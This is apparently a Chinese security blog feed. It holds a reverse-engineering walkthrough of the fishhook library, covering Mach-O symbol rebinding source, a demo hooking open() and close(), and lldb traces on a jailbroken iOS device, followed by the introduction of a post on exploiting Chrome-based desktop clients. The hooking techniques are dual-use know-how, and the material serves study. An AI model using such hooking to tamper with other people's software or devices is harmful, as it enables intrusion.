<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">FISHHOOK_VISIBILITY</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">rebind_symbols</span><span class="params">(struct rebinding rebindings[], <span class="keyword">size_t</span> rebindings_nel)</span></span>;</span><br></pre></td></tr></table></figure>

<p>简单看下关键的调用路径:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">rebind_symbols(struct rebinding rebindings[], <span class="keyword">size_t</span> rebindings_nel);</span><br><span class="line">        _rebind_symbols_for_image(_dyld_get_image_header(i), _dyld_get_image_vmaddr_slide(i));</span><br><span class="line">            rebind_symbols_for_image(_rebindings_head, header, slide);</span><br><span class="line">                perform_rebinding_with_section(...)</span><br></pre></td></tr></table></figure>

<p><code>_rebindings_head</code> 指向一个需要重绑定的符号的单项链表:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rebinding</span> &#123;</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *name;</span><br><span class="line">  <span class="keyword">void</span> *replacement;</span><br><span class="line">  <span class="keyword">void</span> **replaced;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rebindings_entry</span> &#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">rebinding</span> *<span class="title">rebindings</span>;</span></span><br><span class="line">  <span class="keyword">size_t</span> rebindings_nel;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">rebindings_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">rebindings_entry</span> *_<span class="title">rebindings_head</span>;</span></span><br><span class="line"><span class="keyword">segment_command_t</span> *cur_seg_cmd;</span><br><span class="line">  <span class="keyword">segment_command_t</span> *linkedit_segment = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">symtab_command</span>* <span class="title">symtab_cmd</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">dysymtab_command</span>* <span class="title">dysymtab_cmd</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">uintptr_t</span> cur = (<span class="keyword">uintptr_t</span>)header + <span class="keyword">sizeof</span>(<span class="keyword">mach_header_t</span>); <span class="comment">// now, cur points to LOAD_CMDs</span></span><br><span class="line">  <span class="comment">// iter LOAD CMDs</span></span><br><span class="line">  <span class="keyword">for</span> (uint i = <span class="number">0</span>; i &lt; header-&gt;ncmds; i++, cur += cur_seg_cmd-&gt;cmdsize) &#123;</span><br><span class="line">    cur_seg_cmd = (<span class="keyword">segment_command_t</span> *)cur;</span><br><span class="line">    <span class="comment">// find LINK_EDIT seg</span></span><br><span class="line">    <span class="keyword">if</span> (cur_seg_cmd-&gt;cmd == LC_SEGMENT_ARCH_DEPENDENT) &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">strcmp</span>(cur_seg_cmd-&gt;segname, SEG_LINKEDIT) == <span class="number">0</span>) &#123;</span><br><span class="line">        linkedit_segment = cur_seg_cmd;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (cur_seg_cmd-&gt;cmd == LC_SYMTAB) &#123;</span><br><span class="line">      <span class="comment">// find SYMTAB CMD</span></span><br><span class="line">      symtab_cmd = (struct symtab_command*)cur_seg_cmd;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (cur_seg_cmd-&gt;cmd == LC_DYSYMTAB) &#123;</span><br><span class="line">      <span class="comment">// find DYSYM CMD</span></span><br><span class="line">      dysymtab_cmd = (struct dysymtab_command*)cur_seg_cmd;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!symtab_cmd || !dysymtab_cmd || !linkedit_segment ||</span><br><span class="line">      !dysymtab_cmd-&gt;nindirectsyms) &#123;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="comment">// Get indirect symbol table (array of uint32_t indices into symbol table)</span></span><br><span class="line">  <span class="keyword">uint32_t</span> *indirect_symtab = (<span class="keyword">uint32_t</span> *)(linkedit_base + dysymtab_cmd-&gt;indirectsymoff);</span><br><span class="line"></span><br><span class="line">  cur = (<span class="keyword">uintptr_t</span>)header + <span class="keyword">sizeof</span>(<span class="keyword">mach_header_t</span>);</span><br><span class="line">  <span class="keyword">for</span> (uint i = <span class="number">0</span>; i &lt; header-&gt;ncmds; i++, cur += cur_seg_cmd-&gt;cmdsize) &#123;</span><br><span class="line">    cur_seg_cmd = (<span class="keyword">segment_command_t</span> *)cur;</span><br><span class="line">    <span class="keyword">if</span> (cur_seg_cmd-&gt;cmd == LC_SEGMENT_ARCH_DEPENDENT) &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">strcmp</span>(cur_seg_cmd-&gt;segname, SEG_DATA) != <span class="number">0</span> &amp;&amp;</span><br><span class="line">          <span class="built_in">strcmp</span>(cur_seg_cmd-&gt;segname, SEG_DATA_CONST) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">for</span> (uint j = <span class="number">0</span>; j &lt; cur_seg_cmd-&gt;nsects; j++) &#123;</span><br><span class="line">        <span class="keyword">section_t</span> *sect =</span><br><span class="line">          (<span class="keyword">section_t</span> *)(cur + <span class="keyword">sizeof</span>(<span class="keyword">segment_command_t</span>)) + j;</span><br><span class="line">        <span class="keyword">if</span> ((sect-&gt;flags &amp; SECTION_TYPE) == S_LAZY_SYMBOL_POINTERS) &#123;</span><br><span class="line">          perform_rebinding_with_section(rebindings, sect, slide, symtab, strtab, indirect_symtab);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ((sect-&gt;flags &amp; SECTION_TYPE) == S_NON_LAZY_SYMBOL_POINTERS) &#123;</span><br><span class="line">          perform_rebinding_with_section(rebindings, sect, slide, symtab, strtab, indirect_symtab);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">perform_rebinding_with_section</span><span class="params">(struct rebindings_entry *rebindings,</span></span></span><br><span class="line"><span class="params"><span class="function">                                           <span class="keyword">section_t</span> *section,</span></span></span><br><span class="line"><span class="params"><span class="function">                                           <span class="keyword">intptr_t</span> slide,</span></span></span><br><span class="line"><span class="params"><span class="function">                                           <span class="keyword">nlist_t</span> *symtab,</span></span></span><br><span class="line"><span class="params"><span class="function">                                           <span class="keyword">char</span> *strtab,</span></span></span><br><span class="line"><span class="params"><span class="function">                                           <span class="keyword">uint32_t</span> *indirect_symtab)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// if _DATA,CONST</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">bool</span> isDataConst = <span class="built_in">strcmp</span>(section-&gt;segname, SEG_DATA_CONST) == <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//__la_symbol_ptr的reserved1字段标识了section描述的符号在符号表中开始的index</span></span><br><span class="line">  <span class="comment">//动态符号表中第一个需要解析的符号 开始地址</span></span><br><span class="line">  <span class="keyword">uint32_t</span> *indirect_symbol_indices = indirect_symtab + section-&gt;reserved1;</span><br><span class="line">  <span class="comment">// section __la_symbol_ptr</span></span><br><span class="line">  <span class="keyword">void</span> **indirect_symbol_bindings = (<span class="keyword">void</span> **)((<span class="keyword">uintptr_t</span>)slide + section-&gt;addr);</span><br><span class="line">  <span class="keyword">vm_prot_t</span> oldProtection = VM_PROT_READ;</span><br><span class="line">  <span class="comment">// chang memory protection to write &amp;&amp; back old memery protection</span></span><br><span class="line">  <span class="keyword">if</span> (isDataConst) &#123;</span><br><span class="line">    oldProtection = get_protection(rebindings);</span><br><span class="line">    mprotect(indirect_symbol_bindings, section-&gt;size, PROT_READ | PROT_WRITE);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// Traverse section -&gt; symtab</span></span><br><span class="line">  <span class="keyword">for</span> (uint i = <span class="number">0</span>; i &lt; section-&gt;size / <span class="keyword">sizeof</span>(<span class="keyword">void</span> *); i++) &#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> symtab_index = indirect_symbol_indices[i];</span><br><span class="line">    <span class="keyword">if</span> (symtab_index == INDIRECT_SYMBOL_ABS || symtab_index == INDIRECT_SYMBOL_LOCAL ||</span><br><span class="line">        symtab_index == (INDIRECT_SYMBOL_LOCAL   | INDIRECT_SYMBOL_ABS)) &#123;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// nlist_t</span></span><br><span class="line">    <span class="keyword">uint32_t</span> strtab_offset = symtab[symtab_index].n_un.n_strx;</span><br><span class="line">    <span class="keyword">char</span> *symbol_name = strtab + strtab_offset;</span><br><span class="line">    <span class="keyword">bool</span> symbol_name_longer_than_1 = symbol_name[<span class="number">0</span>] &amp;&amp; symbol_name[<span class="number">1</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rebindings_entry</span> *<span class="title">cur</span> =</span> rebindings;</span><br><span class="line">    <span class="keyword">while</span> (cur) &#123;</span><br><span class="line">      <span class="keyword">for</span> (uint j = <span class="number">0</span>; j &lt; cur-&gt;rebindings_nel; j++) &#123;</span><br><span class="line">        <span class="comment">// yes, it&#x27;s target symbol to rebind!</span></span><br><span class="line">        <span class="keyword">if</span> (symbol_name_longer_than_1 &amp;&amp;</span><br><span class="line">            <span class="built_in">strcmp</span>(&amp;symbol_name[<span class="number">1</span>], cur-&gt;rebindings[j].name) == <span class="number">0</span>) &#123;</span><br><span class="line">          <span class="keyword">if</span> (cur-&gt;rebindings[j].replaced != <span class="literal">NULL</span> &amp;&amp;</span><br><span class="line">              indirect_symbol_bindings[i] != cur-&gt;rebindings[j].replacement) &#123;</span><br><span class="line">            *(cur-&gt;rebindings[j].replaced) = indirect_symbol_bindings[i]; <span class="comment">// backup old func </span></span><br><span class="line">          &#125;</span><br><span class="line">          <span class="comment">// do rebind, hook!</span></span><br><span class="line">          **indirect_symbol_bindings[i] = cur-&gt;rebindings[j].replacement;**</span><br><span class="line">          <span class="keyword">goto</span> symbol_loop;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      cur = cur-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">  symbol_loop:;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// restore protection</span></span><br><span class="line">  <span class="keyword">if</span> (isDataConst) &#123;</span><br><span class="line">    <span class="keyword">int</span> protection = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (oldProtection &amp; VM_PROT_READ) &#123;</span><br><span class="line">      protection |= PROT_READ;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (oldProtection &amp; VM_PROT_WRITE) &#123;</span><br><span class="line">      protection |= PROT_WRITE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (oldProtection &amp; VM_PROT_EXECUTE) &#123;</span><br><span class="line">      protection |= PROT_EXEC;</span><br><span class="line">    &#125;</span><br><span class="line">    mprotect(indirect_symbol_bindings, section-&gt;size, protection);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h1><p>直接拿官方的demo编译出来调试分析流程：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">~/study/ios_re_link/fishhook  cat main.c</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdarg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;fishhook.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="title">int</span> <span class="params">(*orig_close)</span><span class="params">(<span class="keyword">int</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="title">int</span> <span class="params">(*orig_open)</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">int</span>, ...)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">my_close</span><span class="params">(<span class="keyword">int</span> fd)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Calling real close(%d)\\n&quot;</span>, fd);</span><br><span class="line">  <span class="keyword">return</span> orig_close(fd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">my_open</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *path, <span class="keyword">int</span> oflag, ...)</span> </span>&#123;</span><br><span class="line">  va_list ap = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  <span class="keyword">mode_t</span> mode = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((oflag &amp; O_CREAT) != <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">// mode only applies to O_CREAT</span></span><br><span class="line">    va_start(ap, oflag);</span><br><span class="line">    mode = va_arg(ap, <span class="keyword">int</span>);</span><br><span class="line">    va_end(ap);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Calling real open(&#x27;%s&#x27;, %d, %d)\\n&quot;</span>, path, oflag, mode);</span><br><span class="line">    <span class="keyword">return</span> orig_open(path, oflag, mode);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Calling real open(&#x27;%s&#x27;, %d)\\n&quot;</span>, path, oflag);</span><br><span class="line">    <span class="keyword">return</span> orig_open(path, oflag, mode);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> * argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">      getchar();</span><br><span class="line">    rebind_symbols((struct rebinding[<span class="number">2</span>])&#123;&#123;<span class="string">&quot;close&quot;</span>, my_close, (<span class="keyword">void</span> *)&amp;orig_close&#125;, &#123;<span class="string">&quot;open&quot;</span>, my_open, (<span class="keyword">void</span> *)&amp;orig_open&#125;&#125;, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Open our own binary and print out first 4 bytes (which is the same</span></span><br><span class="line">    <span class="comment">// for all Mach-O binaries on a given architecture)</span></span><br><span class="line">    <span class="keyword">int</span> fd = open(argv[<span class="number">0</span>], O_RDONLY);</span><br><span class="line">    <span class="keyword">uint32_t</span> magic_number = <span class="number">0</span>;</span><br><span class="line">    read(fd, &amp;magic_number, <span class="number">4</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Mach-O Magic Number: %x \\n&quot;</span>, magic_number);</span><br><span class="line">    close(fd);</span><br><span class="line"></span><br><span class="line">     <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;%</span><br><span class="line"> ~/study/ios_re_link/fishhook  cat Makefile</span><br><span class="line">all:</span><br><span class="line">    xcrun -sdk iphoneos clang main.c fishhook.c -o main -target arm64-apple-ios12<span class="number">.2</span></span><br><span class="line">    codesign -s <span class="string">&quot;A64593A4DDFA3557CCEFF47FC8E688DCD3E6E455&quot;</span> --entitlements entitlements.xml -f main</span><br><span class="line"></span><br><span class="line">push:</span><br><span class="line">    scp main root@<span class="number">10.2</span><span class="number">.5</span><span class="number">.0</span>:/tmp</span><br><span class="line"></span><br><span class="line">clean:</span><br><span class="line">    rm main</span><br></pre></td></tr></table></figure>





<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">* thread #<span class="number">1</span>, <span class="built_in">queue</span> = <span class="string">&#x27;com.apple.main-thread&#x27;</span>, stop reason = step over</span><br><span class="line">    frame #<span class="number">0</span>: <span class="number">0x0000000100a3f6ac</span> main`rebind_symbols_for_image(rebindings=<span class="number">0x00000001012005b0</span>, header=<span class="number">0x0000000100a38000</span>, slide=<span class="number">10715136</span>) at fishhook.c:<span class="number">187</span>:<span class="number">8</span></span><br><span class="line">   <span class="number">184</span>         &#125;</span><br><span class="line">   <span class="number">185</span>       &#125;</span><br><span class="line">   <span class="number">186</span></span><br><span class="line">-&gt; <span class="number">187</span>       <span class="keyword">if</span> (!symtab_cmd || !dysymtab_cmd || !linkedit_segment ||</span><br><span class="line">   <span class="number">188</span>           !dysymtab_cmd-&gt;nindirectsyms) &#123;</span><br><span class="line">   <span class="number">189</span>         <span class="keyword">return</span>;</span><br><span class="line">   <span class="number">190</span>       &#125;</span><br><span class="line">Target <span class="number">0</span>: (main) stopped.</span><br><span class="line">(lldb) po symtab_cmd</span><br><span class="line"><span class="number">0x0000000100a38440</span></span><br><span class="line"></span><br><span class="line">(lldb) po dysymtab_cmd</span><br><span class="line"><span class="number">0x0000000100a38458</span></span><br><span class="line"></span><br><span class="line">(lldb) po linkedit_segment</span><br><span class="line"><span class="number">0x0000000100a383c8</span></span><br><span class="line"></span><br><span class="line">(lldb)</span><br></pre></td></tr></table></figure>

<p>然后找到 <code>LC_SEGMENT_64_DATA</code> 处理 <code>S_LAZY_SYMBOL_POINTERS</code> 和 <code>S_NON_LAZY_SYMBOL_POINTERS</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">(lldb) n</span><br><span class="line">Process <span class="number">2046</span> stopped</span><br><span class="line">* thread #<span class="number">1</span>, <span class="built_in">queue</span> = <span class="string">&#x27;com.apple.main-thread&#x27;</span>, stop reason = step over</span><br><span class="line">    frame #<span class="number">0</span>: <span class="number">0x0000000100a3f828</span> main`rebind_symbols_for_image(rebindings=<span class="number">0x00000001012005b0</span>, header=<span class="number">0x0000000100a38000</span>, slide=<span class="number">10715136</span>) at fishhook.c:<span class="number">215</span>:<span class="number">42</span></span><br><span class="line">   <span class="number">212</span>               perform_rebinding_with_section(rebindings, sect, slide, symtab, strtab, indirect_symtab);</span><br><span class="line">   <span class="number">213</span>             &#125;</span><br><span class="line">   <span class="number">214</span>             <span class="keyword">if</span> ((sect-&gt;flags &amp; SECTION_TYPE) == S_NON_LAZY_SYMBOL_POINTERS) &#123;</span><br><span class="line">-&gt; <span class="number">215</span>               perform_rebinding_with_section(rebindings, sect, slide, symtab, strtab, indirect_symtab);</span><br><span class="line">   <span class="number">216</span>             &#125;</span><br><span class="line">   <span class="number">217</span>           &#125;</span><br><span class="line">   <span class="number">218</span>         &#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/seg.png" alt="seg"></p>
<p>这里为了调试，重点关注 <code>S_LAZY_SYMBOL_POINTERS</code> 的处理</p>
<p>首先在rebind之前查看open符号</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">(lldb) image lookup -va <span class="number">0x0000000100a3fee0</span></span><br><span class="line">      Address: main[<span class="number">0x0000000100007ee0</span>] (main.__TEXT.__stub_helper + <span class="number">180</span>)</span><br><span class="line">      Summary:</span><br><span class="line">       Module: file = <span class="string">&quot;/private/var/tmp/main&quot;</span>, arch = <span class="string">&quot;arm64&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//....</span></span><br><span class="line">Process <span class="number">2046</span> resuming</span><br><span class="line">Process <span class="number">2046</span> stopped</span><br><span class="line">* thread #<span class="number">1</span>, <span class="built_in">queue</span> = <span class="string">&#x27;com.apple.main-thread&#x27;</span>, stop reason = breakpoint <span class="number">4.1</span></span><br><span class="line">    frame #<span class="number">0</span>: <span class="number">0x0000000100a3fbc8</span> main`perform_rebinding_with_section(rebindings=<span class="number">0x00000001012005b0</span>, section=<span class="number">0x0000000100a382d8</span>, slide=<span class="number">10715136</span>, symtab=<span class="number">0x0000000100a44210</span>, strtab=<span class="string">&quot; &quot;</span>, indirect_symtab=<span class="number">0x0000000100a44780</span>) at fishhook.c:<span class="number">135</span>:<span class="number">46</span></span><br><span class="line">   <span class="number">132</span>                 <span class="built_in">strcmp</span>(&amp;symbol_name[<span class="number">1</span>], cur-&gt;rebindings[j].name) == <span class="number">0</span>) &#123;</span><br><span class="line">   <span class="number">133</span>               <span class="keyword">if</span> (cur-&gt;rebindings[j].replaced != <span class="literal">NULL</span> &amp;&amp;</span><br><span class="line">   <span class="number">134</span>                   indirect_symbol_bindings[i] != cur-&gt;rebindings[j].replacement) &#123;</span><br><span class="line">-&gt; <span class="number">135</span>                 *(cur-&gt;rebindings[j].replaced) = indirect_symbol_bindings[i];</span><br><span class="line">   <span class="number">136</span>               &#125;</span><br><span class="line">   <span class="number">137</span>               indirect_symbol_bindings[i] = cur-&gt;rebindings[j].replacement;</span><br><span class="line">   <span class="number">138</span>               <span class="keyword">goto</span> symbol_loop;</span><br><span class="line">Target <span class="number">0</span>: (main) stopped.</span><br><span class="line">(lldb) <span class="function">p <span class="title">symbol_name</span></span></span><br><span class="line"><span class="function"><span class="params">(<span class="keyword">char</span> *)</span> $20 </span>= <span class="number">0x0000000100a44937</span> <span class="string">&quot;_open&quot;</span></span><br><span class="line">(lldb)</span><br></pre></td></tr></table></figure>

<p>首先备份了原函数地址，确保hook后可以通过 <code>orign_open</code>调用到原本的函数。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">(lldb) <span class="function">p <span class="title">i</span></span></span><br><span class="line"><span class="function"><span class="params">(uint)</span> $24 </span>= <span class="number">13</span></span><br><span class="line">(lldb) po indirect_symbol_bindings[<span class="number">13</span>]</span><br><span class="line"><span class="number">0x0000000100a3fee0</span></span><br><span class="line"></span><br><span class="line">(lldb) image lookup -va <span class="number">0x0000000100a3fee0</span></span><br><span class="line">      Address: main[<span class="number">0x0000000100007ee0</span>] (main.__TEXT.__stub_helper + <span class="number">180</span>)</span><br><span class="line">      Summary:</span><br><span class="line">       Module: file = <span class="string">&quot;/private/var/tmp/main&quot;</span>, arch = <span class="string">&quot;arm64&quot;</span></span><br><span class="line"></span><br><span class="line">(lldb)</span><br></pre></td></tr></table></figure>

<p>之后找到函数指针，完成替换</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Process 2046 stopped</span><br><span class="line">* thread <span class="comment">#1, queue = &#x27;com.apple.main-thread&#x27;, stop reason = step over</span></span><br><span class="line">    frame <span class="comment">#0: 0x0000000100a3fbfc main`perform_rebinding_with_section(rebindings=0x00000001012005b0, section=0x0000000100a382d8, slide=10715136, symtab=0x0000000100a44210, strtab=&quot; &quot;, indirect_symtab=0x0000000100a44780) at fishhook.c:137:41</span></span><br><span class="line">   134                   indirect_symbol_bindings[i] != cur-&gt;rebindings[j].replacement) &#123;</span><br><span class="line">   135                 *(cur-&gt;rebindings[j].replaced) = indirect_symbol_bindings[i];</span><br><span class="line">   136               &#125;</span><br><span class="line">-&gt; 137               indirect_symbol_bindings[i] = cur-&gt;rebindings[j].replacement;</span><br><span class="line">   138               goto symbol_loop;</span><br><span class="line">   139             &#125;</span><br><span class="line">   140           &#125;</span><br><span class="line">Target 0: (main) stopped.</span><br><span class="line">(lldb) image list |grep main</span><br><span class="line">[  0] EAE1AE51-465A-32E0-8B3F-195FE2480F4F 0x0000000100a38000 /private/var/tmp/main</span><br><span class="line">      /System/Volumes/Data/Users/muhe/study/ios_re_link/fishhook/main.dSYM/Contents/Resources/DWARF/main(0x0000000100a38000)</span><br><span class="line">(lldb)</span><br><span class="line">(lldb) x/20gx indirect_symbol_bindings</span><br><span class="line">0x100a40018: 0x00000001d8642a68 0x0000000100a3fe50</span><br><span class="line">0x100a40028: 0x0000000100a3fe5c 0x0000000100a3fe68</span><br><span class="line">0x100a40038: 0x0000000100a3fe74 0x00000001d8581374</span><br><span class="line">0x100a40048: 0x0000000100a3f224 0x00000001d8581694</span><br><span class="line">0x100a40058: 0x0000000100a3fea4 0x00000001d860ae30</span><br><span class="line">0x100a40068: 0x00000001d871060c 0x00000001d873dd30</span><br><span class="line">0x100a40078: 0x0000000100a3fed4 0x0000000100a3f270</span><br><span class="line">0x100a40088: 0x0000000100a3feec 0x0000000100a3fef8</span><br><span class="line">0x100a40098: 0x00000001d873dfd0 0x0000000100a3ff10</span><br><span class="line">0x100a400a8: 0x0000000100d04498 0x0000000100a3ff72</span><br><span class="line">(lldb) x/gx 0x100a40078+8</span><br><span class="line">0x100a40080: 0x0000000100a3f270</span><br><span class="line">(lldb)</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line">&gt;&gt;&gt; hex(0x100a40080-0x0000000100a38000)</span><br><span class="line"><span class="string">&#x27;0x8080&#x27;</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/func_ptr.png" alt="func_ptr"></p>
<p>如果调用 原本的函数会走什么流程？</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">0x100a3f448</span> &lt;+<span class="number">176</span>&gt;: bl     <span class="number">0x100a3fd9c</span>               ; symbol stub <span class="keyword">for</span>: close</span><br><span class="line">-&gt;  <span class="number">0x100a3f44c</span> &lt;+<span class="number">180</span>&gt;: adrp   x8, <span class="number">1</span></span><br><span class="line">    <span class="number">0x100a3f450</span> &lt;+<span class="number">184</span>&gt;: ldr    x8, [x8]</span><br><span class="line">    <span class="number">0x100a3f454</span> &lt;+<span class="number">188</span>&gt;: ldr    x8, [x8]</span><br><span class="line">    <span class="number">0x100a3f458</span> &lt;+<span class="number">192</span>&gt;: ldur   x10, [x29, #<span class="number">-0x8</span>]</span><br><span class="line">    <span class="number">0x100a3f45c</span> &lt;+<span class="number">196</span>&gt;: subs   x8, x8, x10</span><br><span class="line">    <span class="number">0x100a3f460</span> &lt;+<span class="number">200</span>&gt;: b.ne   <span class="number">0x100a3f478</span>               ; &lt;+<span class="number">224</span>&gt; at main.c</span><br><span class="line">    <span class="number">0x100a3f464</span> &lt;+<span class="number">204</span>&gt;: mov    w8, #<span class="number">0x0</span></span><br><span class="line">    <span class="number">0x100a3f468</span> &lt;+<span class="number">208</span>&gt;: mov    x0, x8</span><br><span class="line">    <span class="number">0x100a3f46c</span> &lt;+<span class="number">212</span>&gt;: ldp    x29, x30, [sp, #<span class="number">0x70</span>]</span><br><span class="line">    <span class="number">0x100a3f470</span> &lt;+<span class="number">216</span>&gt;: add    sp, sp, #<span class="number">0x80</span>             ; =<span class="number">0x80</span></span><br><span class="line">    <span class="number">0x100a3f474</span> &lt;+<span class="number">220</span>&gt;: ret</span><br><span class="line">    <span class="number">0x100a3f478</span> &lt;+<span class="number">224</span>&gt;: bl     <span class="number">0x100a3fd60</span>               ; symbol stub <span class="keyword">for</span>: __stack_chk_fail</span><br><span class="line">(lldb) dis -a <span class="number">0x100a3fd9c</span></span><br><span class="line">main`close:</span><br><span class="line">    <span class="number">0x100a3fd9c</span> &lt;+<span class="number">0</span>&gt;: nop</span><br><span class="line">    <span class="number">0x100a3fda0</span> &lt;+<span class="number">4</span>&gt;: ldr    x16, #<span class="number">0x2a8</span>               ; (<span class="keyword">void</span> *)<span class="number">0x0000000100a3f224</span>: my_close at /Users/muhe/study/ios_re_link/fishhook/main.c:<span class="number">10</span></span><br><span class="line">    <span class="number">0x100a3fda4</span> &lt;+<span class="number">8</span>&gt;: br     x16</span><br></pre></td></tr></table></figure>





<h1 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h1><p><a href="https://github.com/facebook/fishhook">https://github.com/facebook/fishhook</a></p>
]]></content>
      <categories>
        <category>iOS</category>
      </categories>
      <tags>
        <tag>RE</tag>
        <tag>iOS</tag>
        <tag>fishhook</tag>
      </tags>
  </entry>
  <entry>
    <title>Expand Chrome Exploit : From client to server</title>
    <url>/2021/10/04/Expand-Chrome-From-client-to-server/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>  过去的近一年的时间(本文在21年开的头，期间一直是hidden状态)，我接触了<del>万恶的</del>浏览器安全，不过只是一个脚本小子的水平 :(  </p>
<span id="more"></span>

<p>  最开始是由于一些工作上的因素，关注了一些主流的IM客户端，难易程度不等，当然也看了不少前辈的精彩工作，比如二哥的各种奇妙的xss、伪协议打🐧啥的。无奈功夫不到家只能另辟蹊径，再加上大学时候@wuyan学长某次回学校给我们做小组分享的时候展示了当时印象笔记的一个xss的时候提了一句，很多客户端你可以把它当成一个浏览器来看；至此这才有了后来的探究和一点点成果吧，时至今日，相关漏洞早已修复，攻击手法也早已“众所周知”，所以写个记录也没有什么:D </p>
<h2 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h2><blockquote>
<p>主要是一些Electron和CEF客户端</p>
</blockquote>
